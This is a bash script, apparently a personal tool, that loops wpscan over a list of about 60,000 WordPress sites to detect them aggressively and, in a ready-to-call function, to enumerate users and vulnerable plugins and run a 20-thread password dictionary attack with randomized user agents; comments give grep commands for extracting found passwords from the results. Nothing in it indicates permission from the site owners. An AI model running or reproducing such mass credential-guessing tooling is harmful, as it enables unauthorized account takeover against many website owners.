

#!/bin/bash
# A script for scanning a file of targets based on wpscan

#set -x

clear

printf "${BLUE}\n########################################################################\n${NORMAL}"
printf "${RED}##                 WordPress Auto Mass Scan                              ##${NORMAL}\n"
printf "${RED}##                     Leighton-0    (Oct 2024)                       ##${NORMAL}"
printf "${BLUE}\n########################################################################${NORMAL}\n"


sleep 2

D=$(date +"%y%m%d")						# creates a date variable in the form yymmdd
RESULTS=~/zresults/wp_websites.csv-aa_1.1-60k-results
SECONDS=0
ELAPSED="Elapsed: $(($SECONDS / 3600))hrs $((($SECONDS / 60) % 60))min $(($SECONDS % 60))sec"
I=0
wl_pass=~/ztargets/wp_websites.csv-aa_1.1-60k
#wpscan --update
printf "${BLUE}\n\n########################################################################\n${NORMAL}" >> "${RESULTS}"
printf "${RED}##                 WordPress Auto Mass Scan                       ##${NORMAL}\n" >> "${RESULTS}"
printf "${RED}##    target "${wl_pass}" result "result.${D}"                    ##${NORMAL}" >> "${RESULTS}"
printf "${BLUE}\n########################################################################${NORMAL}\n\n\n" >> "${RESULTS}"
##read -p $'\e[1;92m File path for targets: \e[0m' wl_pass	# -p prompt asks for a file name for the list of sites - names this site wl_pass
wp_pass="${wl_pass}"						# creates a variable called wp_pass
count_pass=$(wc -l $wp_pass | cut -d " " -f1)			# counts the number of lines in wp_pass file
for fn in `cat ${wp_pass}`; do
#printf "%s ${RED}TARGET NAME:- \n" $fn ${NORMAL}\n >> "${RESULTS}"
printf "${RED}\n================================================================================$NORMAL\n" >> "${RESULTS}"
printf "TARGET NAME:- %s \n" ${fn} >> "${RESULTS}"

# OPTION 1  - identify uses and carry out dictionary attack
password_brute() {
	 wpscan --url $fn -e  u vp vt --passwords z_passwords --no-banner --no-update --random-user-agent --max-threads 20 --ignore-main-redirect --force >> "${RESULTS}"
}

# OPTION 2 - identify which sites are running WP from a file of IP addresses
wp_confirm() {
wpscan --url $fn --no-update --force --random-user-agent --ignore-main-redirect --wp-version-detection aggressive --no-banner >> "${RESULTS}"
					# --force disable WP detection; --wp-version-detection aggressive
}

I=$((I+1))
ELAPSED="Elapsed: $(($SECONDS / 3600))hrs $((($SECONDS / 60) % 60))min $(($SECONDS % 60))sec"
printf "Loop number %-1d of %-.3d  Target = $fn \t\t Runtime = ${ELAPSED} \n" $I  $count_pass >> ~/zresults/counter.txt-60k

# Select option
wp_confirm
done
#printf "Finished - check the results"
printf '\n\n\n\n'
ELAPSED="Elapsed: $(($SECONDS / 3600))hrs $((($SECONDS / 60) % 60))min $(($SECONDS % 60))sec"
    printf "\n${CYAN}Finished - Runtime = ${ELAPSED}${NORMAL}\n"

#cat "results.${D}"

#   README
#   Usefull for parsing results
#   cat result1 | grep -v Error: | grep -v Progress: | grep 'passwords \| Passwords \| password \| Password'  > result2 && less result2

#   TO DO
#   Improve Parsing
#   cat result1 | grep -v Error: | grep -v Progress: | grep 'passwords \| Passwords \| password \| Password'  > result2 && less result2
# cat results | grep -v Error: | grep -v Progress: | grep 'passwords \| Passwords \| password \| Password'  > "results.${d}.parsed" 

# cat results.${d} | grep -v Error: | grep -v Progress: | grep 'passwords \| Passwords \| password \| Password'  > "results.${d}.parsed"

# cat results.${d}.parsed

#   README
#   Usefull for parsing results
#   cat result1 | grep -v Error: | grep -v Progress: | grep 'passwords \| Passwords \| password \| Password'  > result2 && less result2

#   TO DO
#   Improve Parsing
#   cat result1 | grep -v Error: | grep -v Progress: | grep 'passwords \| Passwords \| password \| Password'  > result2 && less result2

